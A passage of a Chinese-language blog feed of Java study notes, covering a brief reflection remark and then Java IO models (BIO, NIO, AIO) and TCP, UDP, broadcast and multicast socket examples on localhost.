title="安全问题原理"></a>安全问题原理</h3><p>每个类都有且仅有一个class对象。通过类和对象都能获取到类的class对象，获取到class对象有下面三种方式。</p><pre><code>1.Student.class   //通过类名.class的方式获取class对象2.stu1.getClass()   //通过类对象.getClass()的方式获取class对象3.Class.forName(&quot;com.test.Student&quot;)  //通过全限定名的方式获取class对象</code></pre><p>Java反射的主要作用是通过class对象来对类的属性和方法进行获取和调用，但是还有一个极为重要的特征就是可以调用类的私有方法（包括protected和private）。这种的特性是后续很多java反序列化利用链依赖反射机制的重要原因。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java IO</title>
      <link href="/2023/12/15/Java-IO/"/>
      <url>/2023/12/15/Java-IO/</url>
      
        <content type="html"><![CDATA[<h4 id="Java-IO一览表"><a href="#Java-IO一览表" class="headerlink" title="Java IO一览表"></a>Java IO一览表</h4><p><a href="https://smms.app/image/lxEK1eG4MWaQvqS" target="_blank"><img src="https://s2.loli.net/2023/12/15/lxEK1eG4MWaQvqS.png" ></a></p><h2 id="同步-异步-阻塞-非阻塞"><a href="#同步-异步-阻塞-非阻塞" class="headerlink" title="同步|异步|阻塞|非阻塞"></a>同步|异步|阻塞|非阻塞</h2><h4 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h4><p>  指的是协同步调。既然叫协同，所以至少要有2个以上的事物存在。协同的结果就是：多个事物不能同时进行，必须一个一个的来，上一个事物结束后，下一个事物才开始。</p><h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><p>  就是步调各异。既然是各异，那就是都不相同。所以结果就是：多个事物可以你进行你的、我进行我的，谁都不用管谁，所有的事物都在同时进行中。</p><h4 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h4><p>  所谓阻塞：指的是阻碍堵塞。它的本意可以理解为由于遇到了障碍而造成的动弹不得。</p><h4 id="非阻塞"><a href="#非阻塞" class="headerlink" title="非阻塞"></a>非阻塞</h4><p>  所谓非阻塞：自然是和阻塞相对，可以理解为由于没有遇到障碍而继续畅通无阻。</p><h2 id="BIO"><a href="#BIO" class="headerlink" title="BIO"></a>BIO</h2><p><strong>同步并阻塞</strong>，服务器实现模式为一个连接一个线程<br>  如果这个连接不做任何事情会造成不必要的线程开销，当然可以通过线程池机制改善。<br>  BIO方式适用于连接数目比较小且固定的架构，这种方式对服务器资源要求比较高，并发局限于应用中。<br><a href="https://smms.app/image/LnWFysMRue63GE2" target="_blank"><img src="https://s2.loli.net/2023/12/15/LnWFysMRue63GE2.jpg" ></a></p><h4 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h4><pre class="line-numbers language-Java"><code class="language-Java">public static void main(String args[]) throws IOException &#123;    //新建连接    ServerSocket serverSocket = new ServerSocket(30888);    System.out.println("Start accept...");    Socket socket = serverSocket.accept();        //缓冲区读入    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));    PrintWriter writer = new PrintWriter(socket.getOutputStream());    writer.println("Connection Success!");    writer.flush();        //关闭读取    reader.close();    writer.close();    socket.close();    serverSocket.close();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h4><pre class="line-numbers language-Java"><code class="language-Java">public static void main(String args[]) throws IOException, UnknownHostException &#123;    //新建连接    Socket socket = new Socket(InetAddress.getLocalHost(), 30888);    PrintWriter writer = new PrintWriter(socket.getOutputStream());        //输入    Scanner scanner = new Scanner(System.in);    String readline = "";        //单方法使用lamda表达式    Thread thread = new Thread(() -> &#123;        int size = -1;        byte[] bytes = new byte[1024];        StringBuilder sb = new StringBuilder(1024);        try &#123;            //执行代码        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;);        //开启线程，关闭连接    thread.start();    scanner.close();    writer.close();    socket.close();    thread.interrupt();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="伪异步IO"><a href="#伪异步IO" class="headerlink" title="伪异步IO"></a>伪异步IO</h2><p>  BIO模式的服务端是1:1的线程开销，访问量越大，系统将发生线程栈溢线程创建失败，最终导致进程宕机或者僵死，从而不能对外提供服务。<br>  伪异步IO的通信采用线程池和任务队列实现，当客户端接入时，将客户端的Socket封装成一个Task交给后端的线程池中进行处理。<br>  JDK的线程池维护一个消息队列和N个活跃的线程，对消息队列中Socket任务进行处理，由于线程池可以设置消息队列的大小和最大线程数，因此，它的资源占用是可控的，无论多少个客户端并发访问，都不会导致资源的耗尽和宕机。<br>  伪异步io采用了线程池实现，因此避免了为每个请求创建一个独立线程造成线程资源耗尽的问题，但由于底层依然是采用的同步阻塞模型，因此无法从根本上解决问题。<br>  如果单个消息处理的缓慢，或者服务器线程池中的全部线程都被阻塞，那么后续scket的io消息都将在队列中排排队。新的Socket请求将被拒绝，客户端会发生大量连接超时。<br><a href="https://smms.app/image/6MEzeTd9OHurkcY" target="_blank"><img src="https://s2.loli.net/2023/12/15/6MEzeTd9OHurkcY.jpg" ></a></p><h2 id="NIO"><a href="#NIO" class="headerlink" title="NIO"></a>NIO</h2><p><strong>同步非阻塞</strong>，服务器实现模式为一个请求一个线程<br>  多路复用器轮询到连接有I/O请求时才启动一个线程进行处理。<br>  NIO 新增了 Channel、Selector、Buffer 等抽象概念，支持面向缓冲、基于通道的 I/O 操作方法。<br>  NIO方式适用于连接数目多且连接比较短（轻操作）的架构，比如聊天服务器，并发局限于应用中。<br><a href="https://smms.app/image/f9czQpCtwxXGyae" target="_blank"><img src="https://s2.loli.net/2023/12/15/f9czQpCtwxXGyae.jpg" ></a></p><ul><li><strong>通道channel：</strong> 绑定一个缓存区，缓存区与磁盘文件的相互传输依靠 channel 双向通道。</li><li><strong>缓存区Buffer：</strong> Buffer 就像一个数组，可以保存多个相同类型的数据。BIO的Buffer只能单向，NIO可以双向。</li><li><strong>选择器Selector（多路复用器）：</strong> 将 Channel 注册之后可用于检查一个或多个 Channel 的状态是否处于连接就绪、接受就绪、可读就绪、可写就绪。</li></ul><h4 id="直接缓冲区与非直接缓冲区"><a href="#直接缓冲区与非直接缓冲区" class="headerlink" title="直接缓冲区与非直接缓冲区"></a>直接缓冲区与非直接缓冲区</h4><p><a href="https://smms.app/image/FQq3BDO7KityXRU" target="_blank"><img src="https://s2.loli.net/2023/12/15/FQq3BDO7KityXRU.jpg" ></a><br>  <strong>应用程序想从磁盘中读取一个数据时会向操作系统发起一个读请求，首先磁盘中的数据被读取到内核地址空间中，然后会把内核地址空间中的数据拷贝到用户地址空间中（其实就是 JVM 内存中），最后再把这个数据读取到应用程序中来。</strong></p><p><a href="https://smms.app/image/Wa9jEf7qu5UyOJt" target="_blank"><img src="https://s2.loli.net/2023/12/15/Wa9jEf7qu5UyOJt.jpg" ></a><br><strong>直接用物理内存作为缓冲区，读写数据直接通过物理内存进行。</strong></p><h4 id="分散读取与聚集写入"><a href="#分散读取与聚集写入" class="headerlink" title="分散读取与聚集写入"></a>分散读取与聚集写入</h4><p>  分散读取是指从 Channel 中读取的数据按照缓冲区的顺序 “分散” 到多个 Buffer 中<br>  聚集写入是指将多个 Buffer 中的数据按照缓冲区的顺序 “聚集” 到 Channel</p><pre class="line-numbers language-Java"><code class="language-Java">public static void test4() throws Exception &#123;    RandomAccessFile raf = new RandomAccessFile("a.txt", "rw");    // 获取通道    FileChannel channel = raf.getChannel();    // 分配指定大小缓冲区    ByteBuffer buf1 = ByteBuffer.allocate(2);    ByteBuffer buf2 = ByteBuffer.allocate(1024);    // 分散读取    ByteBuffer[] bufs = &#123;buf1, buf2&#125;;    channel.read(bufs);  // 参数需要一个数组    for (ByteBuffer byteBuffer : bufs) &#123;        byteBuffer.flip();  // 切换到读模式    &#125;    System.out.println(new String(bufs[0].array(), 0, bufs[0].limit()));  // 打印 he    System.out.println(new String(bufs[1].array(), 0, bufs[1].limit()));  // 打印 llo    // 聚集写入    RandomAccessFile raf2 = new RandomAccessFile("e.txt","rw");    // 获取通道    FileChannel channel2 = raf2.getChannel();    channel2.write(bufs);  // 把 bufs 里面的几个缓冲区聚集到 channel2 这个通道中，聚集到通道中，也就是到了 e.txt 文件中    channel2.close();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">public static void main(String[] args) throws  Exception&#123;        //创建ServerSocketChannel，-->> ServerSocket        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();        InetSocketAddress inetSocketAddress = new InetSocketAddress(5555);        serverSocketChannel.socket().bind(inetSocketAddress);                //设置成非阻塞        serverSocketChannel.configureBlocking(false);          //开启selector,并注册accept事件        Selector selector = Selector.open();        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);                //循环接收请求        while(true) &#123;            selector.select(2000);  //监听所有通道            //遍历selectionKeys            Set<SelectionKey> selectionKeys = selector.selectedKeys();            Iterator<SelectionKey> iterator = selectionKeys.iterator();            while (iterator.hasNext()) &#123;                SelectionKey key = iterator.next();                                //处理连接事件                if(key.isAcceptable()) &#123;                      SocketChannel socketChannel = serverSocketChannel.accept();                                        //设置为非阻塞                    socketChannel.configureBlocking(false);                      System.out.println("client:" + socketChannel.getLocalAddress() + " is connect");                                        //注册客户端读取事件到selector                    socketChannel.register(selector, SelectionKey.OP_READ);                 &#125; else if (key.isReadable()) &#123;  //处理读取事件                    ByteBuffer byteBuffer = ByteBuffer.allocate(1024);                    SocketChannel channel = (SocketChannel) key.channel();                    channel.read(byteBuffer);                    System.out.println("client:" + channel.getLocalAddress() + " send " + new String(byteBuffer.array()));                &#125;                iterator.remove();  //事件处理完毕，要记得清除            &#125;        &#125;     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class NIOClient &#123;     public static void main(String[] args) throws Exception&#123;               SocketChannel socketChannel = SocketChannel.open();                                //设置成非阻塞            socketChannel.configureBlocking(false);            InetSocketAddress inetSocketAddress = new InetSocketAddress("127.0.0.1", 5555);             if(!socketChannel.connect(inetSocketAddress)) &#123;                while (!socketChannel.finishConnect()) &#123;                    System.out.println("客户端正在连接中，请耐心等待");                &#125;            &#125;             ByteBuffer byteBuffer = ByteBuffer.wrap("mikechen的互联网架构".getBytes());            socketChannel.write(byteBuffer);            socketChannel.close();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="AIO"><a href="#AIO" class="headerlink" title="AIO"></a>AIO</h2><p><strong>异步非阻塞</strong>，服务器实现模式为一个有效请求一个线程</p><p>  Java AIO 采用订阅-通知模式：即应用程序向操作系统注册IO监听，然后继续做自己的事情。当操作系统发生IO事件，并且准备好数据后，在主动通知应用程序，触发相应的函数。</p><p>客户端的I/O请求都是由OS先完成了再通知服务器应用去启动线程进行处理。</p><p>  AIO方式使用于连接数目多且连接比较长（重操作）的架构，比如相册服务器，充分调用OS参与并发操作。</p><p><em><strong>IO模型是由操作系统提供支持的</strong></em></p><p>  windows系统提供了一种异步IO技术：<code>IOCP</code>（I/O CompletionPort，I/O完成端口）<br>  Linux下由于没有这种异步IO技术，所以使用 <code>epoll</code> 对异步IO进行模拟。</p><p>代码层面如下图所示结构。<br><a href="https://smms.app/image/r5iY9NuJVtgOBQx" target="_blank"><img src="https://s2.loli.net/2023/12/15/r5iY9NuJVtgOBQx.jpg" ></a></p><h2 id="三者比较"><a href="#三者比较" class="headerlink" title="三者比较"></a>三者比较</h2><p><a href="https://smms.app/image/YHS1Ixk3isQnJWa" target="_blank"><img src="https://s2.loli.net/2023/12/15/YHS1Ixk3isQnJWa.jpg" ></a></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  <strong>马上期末了，这两天把java剩下的反射和容器写完，然后——再鸽一段时间 hhh</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java网络编程</title>
      <link href="/2023/12/14/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>/2023/12/14/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  <strong>这篇文章我觉得我对于网络基础部分就不用再说更多了，直接一张图就够。剩下的用代码和注释来说明，看懂就是学会。</strong><br><a href="https://smms.app/image/Yv5mfec4P3sdFHt" target="_blank"><img src="https://s2.loli.net/2023/12/14/Yv5mfec4P3sdFHt.png" ></a></p><h2 id="单播通信"><a href="#单播通信" class="headerlink" title="单播通信"></a>单播通信</h2><h3 id="TCP通信"><a href="#TCP通信" class="headerlink" title="TCP通信"></a>TCP通信</h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Sever &#123;    public static void main(String[] args) &#123;        ServerSocket serverSocket = null;   //初始化定义为空保证安全        Socket socket = null;        InputStream is = null;        ByteArrayOutputStream baos = null;        try &#123;            //创建ServerSocket对象，监听9999端口            serverSocket = new ServerSocket(9999);            //等待客户端的连接请求，返回一个Socket对象，程序阻塞在此处直到有客户端连接            socket = serverSocket.accept();            //获取输入流，用于读取客户端发送的数据            is = socket.getInputStream();            //创建字节数组输出流，用于存储读取到的数据            baos = new ByteArrayOutputStream();            //预定义缓冲区数组大小，方便存储数据            byte[] buffer = new byte[1024];            int len;            //循环读取客户端发送的数据，将数据存储到字节数组输出流中            while((len = is.read(buffer))!=-1)&#123;                //要写入的字节数组，从第一个元素开始写入，写入的字节数量                baos.write(buffer,0,len);              &#125;            //将字节数组输出流中的数据转换为字符串并输出到控制台            System.out.println(baos.toString());            //关闭字节数组输出流和输入流            baos.close();            is.close();            //关闭Socket对象和ServerSocket对象            socket.close();            serverSocket.close();        &#125; catch (IOException e)&#123;            e.printStackTrace(); //打印异常信息        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent &#123;    public static void main(String[] args) &#123;        Socket socket = null;   // 用于建立客户端与服务器之间的套接字连接        OutputStream os = null; // 用于向服务器发送数据的输出流        try &#123;                        // 通过IP地址获取服务器的InetAddress实例            InetAddress serverIP = InetAddress.getByName("127.0.0.1");             int port = 9999; // 连接服务器的端口号            // 创建套接字连接至服务器            socket = new Socket(serverIP, port);            // 通过套接字获取输出流，用于向服务器发送数据            os = socket.getOutputStream();            // 向服务器发送数据，需要            os.write("Hello, world!".getBytes());              //getBytes()方法编码为 byte 序列，并将结果存储到一个新的 byte 数组中        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125; finally &#123;            if (socket != null) &#123;                try &#123;                    socket.close(); // 关闭套接字连接                &#125; catch (IOException e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="UDP通信"><a href="#UDP通信" class="headerlink" title="UDP通信"></a>UDP通信</h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Sever &#123;    public static void main(String[] args) throws Exception &#123;            //创建DatagramSocket对象，监听6666端口        DatagramSocket socket = new DatagramSocket(6666);                //一直循环接收信息        while (true) &#123;            byte[] container = new byte[1024];                        //创建DatagramPacket对象，用于接收客户端发送的数据（合成一个包）            DatagramPacket packet = new DatagramPacket(container,0,container.length);            //要发送或接收的数据的字节数组，从头开始读取或写入，读取或写入的字节数                        //接收客户端发送的数据            socket.receive(packet);            byte[] data = packet.getData();            //获取接收到的数据，返回一个字节数组                        //将接收到的字节数组（包）转换为字符串            String receiveDatas = new String(data,0,packet.getLength());            System.out.println(receiveDatas);                        //判断是否输入了“bye”，如果是则退出循环            if (receiveDatas.trim().equals("bye")) &#123;                break;            &#125;        &#125;                //关闭DatagramSocket对象        socket.close();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent &#123;    public static void main(String[] args) throws Exception &#123;        try &#123;                    //创建DatagramSocket对象，监听8888端口            DatagramSocket socket = new DatagramSocket(8888);                        //创建BufferedReader对象，用于从控制台读取数据            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));                                //一直循环接收信息            while (true) &#123;                            //从控制台读取数据                String data = reader.readLine();                                //将读取到的字符串转换为字节数组                byte[] datas = data.getBytes();                                //创建DatagramPacket对象，打包好数据，指定发送的目标地址和端口号                DatagramPacket packet = new DatagramPacket(datas,0,datas.length,new InetSocketAddress("127.0.0.1",6666));                                //发送数据                socket.send(packet);                                //判断是否输入了“bye”，如果是则退出循环                if (data.equals("bye")) &#123;                    break;                &#125;            &#125;                        //关闭DatagramSocket对象            socket.close();        &#125; catch (SocketException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="多线程通信"><a href="#多线程通信" class="headerlink" title="多线程通信"></a>多线程通信</h3><h4 id="服务端-2"><a href="#服务端-2" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">//继承Runnable接口public class Sever implements Runnable &#123;       DatagramSocket socket = new DatagramSocket(6666);    private int port;    private String msgfrom;    public Sever(int port,String msgfrom) throws IOException &#123;        this.port = port;        this.msgfrom = msgfrom;        socket = new DatagramSocket(6666);    &#125;        //重写run()方法    public void run() &#123;           try &#123;            while (true) &#123;                byte[] container = new byte[1024];                //创建DatagramPacket对象，用于接收客户端发送的数据                DatagramPacket packet = new DatagramPacket(container,0,container.length);                //接收客户端发送的数据                socket.receive(packet);                byte[] data = packet.getData();                //将接收到的字节数组转换为字符串                String receiveDatas = new String(data,0,data.length);                System.out.println(msgfrom + ":" + receiveDatas);                //判断是否输入了“bye”，如果是则退出循环                //trim()去除首尾空格，equals()比较对象，被比较的放前面                if (receiveDatas.trim().equals("bye")) &#123;                    break;                &#125;            &#125;            //关闭DatagramSocket对象            socket.close();        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端-2"><a href="#客户端-2" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent implements Runnable &#123;    DatagramSocket socket = null;    BufferedReader reader = null;    private String toIP;    private int fromport;    private int toport;    public Cilent(int fromIP,String toIP,int toport) throws SocketException &#123;        this.fromport = fromport;        this.toport = toport;        this.toIP = toIP;        //创建DatagramSocket对象，监听指定端口        socket = new DatagramSocket(fromport);        //创建BufferedReader对象，用于从控制台读取数据        reader = new BufferedReader(new InputStreamReader(System.in));    &#125;    public void run() &#123;        try &#123;            while (true) &#123;                //从控制台读取数据                String data = reader.readLine();                //将读取到的字符串转换为字节数组                byte[] datas = data.getBytes();                //创建DatagramPacket对象，指定发送的目标地址和端口号                DatagramPacket packet = new DatagramPacket(datas,0,datas.length,new InetSocketAddress(this.toIP,this.toport));                //发送数据                socket.send(packet);                //判断是否输入了“bye”，如果是则退出循环                if (data.equals("bye")) &#123;                    break;                &#125;            &#125;            //关闭DatagramSocket对象            socket.close();        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="广播通信"><a href="#广播通信" class="headerlink" title="广播通信"></a>广播通信</h2><h3 id="服务端-3"><a href="#服务端-3" class="headerlink" title="服务端"></a>服务端</h3><pre class="line-numbers language-Java"><code class="language-Java">public class Sever &#123;    public static void main(String args[]) &#123;        int port = 5858;        InetAddress group = null;        MulticastSocket socket = null;        try &#123;            //创建InetAddress对象，指定广播地址            group = InetAddress.getByName("127.0.0.1");            //创建MulticastSocket对象，监听指定端口            socket = new MulticastSocket(port);            //创建InetSocketAddress对象，指定广播地址和端口            InetSocketAddress socketAddress = new InetSocketAddress(group,port);            //获取指定网卡的NetworkInterface对象            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(group);            //加入广播组            socket.joinGroup(socketAddress,networkInterface);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;        while (true) &#123;            byte data[] = new byte[8192];            DatagramPacket packet = null;            //创建DatagramPacket对象，用于接收广播内容            packet = new DatagramPacket(data,data.length,group,port);            try &#123;                socket.receive(packet);                //将接收到的字节数组转换为字符串                String message = new String(packet.getData(),0,packet.getLength());                System.out.println("接收的内容：" + message);            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="客户端-3"><a href="#客户端-3" class="headerlink" title="客户端"></a>客户端</h3><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent &#123;    // Broadcast    String s = "abcd";    int port = 8989;    InetAddress group = null;    MulticastSocket socket = null;    Cilent() &#123;        try &#123;            //创建InetAddress对象，指定广播地址（路由器指定的）            group = InetAddress.getByName("255.255.255.255");            //创建MulticastSocket对象，监听指定端口            //  (注意，从这里开始DatagramSocket已经变成了MulticastSocket)            socket = new MulticastSocket(port);            //设置TTL值为1，表示只在本地网络中广播，TTL值是该字段指定IP包被路由器丢弃之前允许通过的最大网段数量，1代表只能通过一个网段            socket.setTimeToLive(1);            //创建InetSocketAddress对象，指定广播地址和端口            InetSocketAddress socketAddress = new InetSocketAddress(group,port);            //获取指定网卡的NetworkInterface对象            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(group);            //加入广播组            socket.joinGroup(socketAddress,networkInterface);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    public void play() &#123;        while (true) &#123;            try &#123;                DatagramPacket packet = null;                byte data[] = s.getBytes();                //创建DatagramPacket对象，指定发送的目标地址和端口号                packet = new DatagramPacket(data,data.length,group,port);                System.out.println(new String(data));                //发送数据                socket.send(packet);                Thread.sleep(2000);            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;    public static void main(String args[]) &#123;        new Cilent().play();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="多播通信"><a href="#多播通信" class="headerlink" title="多播通信"></a>多播通信</h2><h3 id="服务器接收端程序"><a href="#服务器接收端程序" class="headerlink" title="服务器接收端程序"></a>服务器接收端程序</h3><pre class="line-numbers language-Java"><code class="language-Java">public class TestMain &#123;    private static MulticastSocket ds;   //多播套接字对象    static String multicastHost="239.0.0.255";   //多播组地址    static InetAddress receiveAddress;   //接收地址对象    public static void main(String[] args) throws IOException &#123;            // 创建多播套接字，绑定到本地的8899端口        ds = new MulticastSocket(8899);                  // 获取多播组地址        receiveAddress=InetAddress.getByName(multicastHost);                 // 将套接字加入多播组        ds.joinGroup(receiveAddress);                // 开启一个新线程，并将多播套接字对象传递给udpRunnable对象        new Thread(new udpRunnable(ds)).start();      &#125;&#125;class udpRunnable implements Runnable &#123;    MulticastSocket ds;    public udpRunnable(MulticastSocket ds) &#123;        this.ds=ds;    &#125;    public void run() &#123;            // 创建一个用于接收数据的缓冲区        byte buf[] = new byte[1024];          DatagramPacket dp = new DatagramPacket(buf, 1024);          while (true) &#123;              try &#123;                              // 从多播套接字中接收数据，并将数据存储到数据包对象中                ds.receive(dp);                                  // 打印接收到的客户端消息                System.out.println("receive client message : "+new String(buf, 0, dp.getLength()));              &#125; catch (Exception e) &#123;                  e.printStackTrace();              &#125;          &#125;      &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="客户发送端"><a href="#客户发送端" class="headerlink" title="客户发送端"></a>客户发送端</h3><pre class="line-numbers language-Java"><code class="language-Java">public class SendUdp &#123;    public static void main(String[] args) throws IOException &#123;        MulticastSocket ms=null;         DatagramPacket dataPacket = null;         ms = new MulticastSocket();                // 设置多播数据包的生存时间为32        ms.setTimeToLive(32);                  // 将字符串 "组播 测试" 转换为字节数组 data        byte[] data = "组播 测试".getBytes();                   // 获取多播组地址 address 对象        InetAddress address = InetAddress.getByName("239.0.0.255");                  // 创建数据包 dataPacket，指定数据、数据长度、目标地址和端口        dataPacket = new DatagramPacket(data, data.length, address,8899);                 // 发送数据包        ms.send(dataPacket);                  // 关闭套接字        ms.close();       &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="IP地址分级"><a href="#IP地址分级" class="headerlink" 